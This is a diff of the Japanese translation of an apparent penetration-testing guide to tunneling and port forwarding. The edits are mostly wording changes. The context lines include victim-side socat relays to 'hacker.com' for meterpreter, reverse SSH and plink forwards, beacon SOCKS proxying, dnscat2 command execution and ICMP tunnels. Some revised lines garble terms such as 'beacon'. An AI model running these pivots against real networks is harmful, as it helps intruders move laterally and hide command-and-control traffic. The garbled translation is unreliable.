@@ -5,7 +5,7 @@
 ## Nmapのヒント
 
 > [!WARNING]
-> **ICMP**および**SYN**スキャンはソックスプロキシを通してトンネリングできないため、**pingディスカバリー**を**無効に**し（`-Pn`）、**TCPスキャン**（`-sT`）を指定する必要があります。
+> **ICMP**および**SYN**スキャンはソックスプロキシを通じてトンネリングできないため、**pingディスカバリーを無効にする**必要があります（`-Pn`）および**TCPスキャン**（`-sT`）を指定する必要があります。
 
 ## **Bash**
 
@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-両方のデバイスで**rootが必要**です（新しいインターフェースを作成するため）し、sshdの設定はrootログインを許可する必要があります：\
+両方のデバイスで**rootが必要**です（新しいインターフェースを作成するため）およびsshdの設定でrootログインを許可する必要があります：\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -83,14 +83,14 @@ ifconfig tun0 up #Activate the server side network interface
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
-クライアント側に新しいルートを設定する
+クライアント側で新しいルートを設定する
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
 あなたは**ssh**を介してホストを通じて**サブネットワーク**へのすべての**トラフィック**を**トンネル**することができます。\
-例えば、10.10.10.0/24に向かうすべてのトラフィックを転送します。
+例えば、10.10.10.0/24へのすべてのトラフィックを転送します。
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -134,7 +134,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKSプロキシ
 
-すべてのインターフェースでリッスンしているチームサーバーにポートを開き、**ビークンを通じてトラフィックをルーティングする**ことができます。
+チームサーバーでポートを開き、すべてのインターフェースでリッスンし、**ビコーンを通じてトラフィックをルーティングする**ことができます。
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -145,7 +145,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> この場合、**ポートはビーコンホストで開かれます**。チームサーバーではなく、トラフィックはチームサーバーに送信され、そこから指定されたホスト:ポートに送信されます。
+> この場合、**ポートはビーコーンホストで開かれます**。チームサーバーではなく、トラフィックはチームサーバーに送信され、そこから指定されたホスト:ポートに送られます。
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
@@ -286,7 +286,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-あなたは被害者のコンソールで最後の行の代わりにこの行を実行することで**非認証プロキシ**をバイパスできます：
+非認証プロキシをバイパスするには、被害者のコンソールで最後の行の代わりにこの行を実行します:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -312,7 +312,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-ローカルSSHポート（22）を攻撃者ホストの443ポートに接続します
+ローカルSSHポート（22）を攻撃者ホストの443ポートに接続します。
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -320,9 +320,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-これはコンソール版のPuTTYのようなもので（オプションはsshクライアントに非常に似ています）、
+これはコンソール版のPuTTYのようなもので（オプションはsshクライアントに非常に似ています）。
 
-このバイナリは被害者のマシンで実行され、sshクライアントであるため、リバース接続を確立するためにsshサービスとポートを開く必要があります。次に、ローカルでアクセス可能なポートを自分のマシンのポートに転送するには：
+このバイナリは被害者のコンピュータで実行され、sshクライアントであるため、リバース接続を確立するためにsshサービスとポートを開く必要があります。次に、ローカルでアクセス可能なポートを自分のマシンのポートに転送するには：
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -331,7 +331,7 @@ echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0
 
 ### Port2Port
 
-任意のポートに対してローカル管理者である必要があります。
+ローカル管理者である必要があります（任意のポートについて）
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
 # Example:
@@ -354,13 +354,13 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-今、私たちは **`mstsc.exe`** を使用して **RDP** 経由で **victim** に **接続** でき、**SocksOverRDP プラグインが有効になっている** という **プロンプト** が表示され、**127.0.0.1:1080** で **リッスン** することになります。
+今、私たちは **`mstsc.exe`** を使用して **RDP** 経由で **victim** に **接続** できます。**SocksOverRDP プラグインが有効になっている** という **プロンプト** が表示され、**127.0.0.1:1080** で **リッスン** します。
 
 **RDP** 経由で **接続** し、victim マシンに `SocksOverRDP-Server.exe` バイナリをアップロードして実行します:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-攻撃者のマシンでポート1080がリッスンしていることを確認してください：
+攻撃者のマシンでポート1080がリッスンしていることを確認します:
 ```
 netstat -antb | findstr 1080
 ```
@@ -383,7 +383,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-プロキシに対して認証を行い、指定した外部サービスに転送されるローカルポートをバインドします。これにより、このポートを通じてお好みのツールを使用できます。\
+プロキシに対して認証を行い、指定した外部サービスに転送されるローカルポートをバインドします。これにより、このポートを介してお好みのツールを使用できます。\
 例えば、ポート443を転送します。
 ```
 Username Alice
@@ -393,7 +393,7 @@ Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
 今、例えば被害者の**SSH**サービスをポート443でリッスンするように設定した場合、攻撃者はポート2222を通じて接続できます。\
-また、**meterpreter**を使用してlocalhost:443に接続し、攻撃者がポート2222でリッスンしていることも可能です。
+また、**meterpreter**を使用してlocalhost:443に接続し、攻撃者がポート2222でリッスンしていることもできます。
 
 ## YARP
 
@@ -430,7 +430,7 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 #### **PowerShellで**
 
-[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)を使用して、PowerShellでdnscat2クライアントを実行できます：
+[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)を使用して、PowerShellでdnscat2クライアントを実行できます:
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
@@ -442,7 +442,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### プロキシチェインのDNSを変更する
 
-Proxychainsは`gethostbyname` libcコールをインターセプトし、tcp DNSリクエストをsocksプロキシを通してトンネリングします。**デフォルト**では、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコーディングされています）。これを変更するには、ファイルを編集します: _/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。
+Proxychainsは`gethostbyname` libcコールをインターセプトし、TCP DNSリクエストをソックスプロキシを通じてトンネリングします。**デフォルト**では、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコーディングされています）。これを変更するには、ファイルを編集します: _/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。
 
 ## Goでのトンネル
 
@@ -455,7 +455,7 @@ Proxychainsは`gethostbyname` libcコールをインターセプトし、tcp DNS
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-両方のシステムでルート権限が必要で、tunアダプタを作成し、ICMPエコーリクエストを使用してデータをトンネリングします。
+ルート権限が両方のシステムで必要で、ICMPエコーリクエストを使用してトンアダプタを作成し、データをトンネリングします。
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -463,7 +463,7 @@ ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.1
 ```
 ### ptunnel-ng
 
-[**ここからダウンロード**](https://github.com/utoni/ptunnel-ng.git).
+[**ここからダウンロード**](https://github.com/utoni/ptunnel-ng.git)。
 ```bash
 # Generate it
 sudo ./autogen.sh
@@ -480,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **は、1つのコマンドラインでソリューションをインターネットに公開するためのツールです。**\
-&#xNAN;_&#x45;xposition URI は次のようになります:_ **UID.ngrok.io**
+_&#x45;xposition URI は次のようになります:_ **UID.ngrok.io**
 
 ### インストール
 
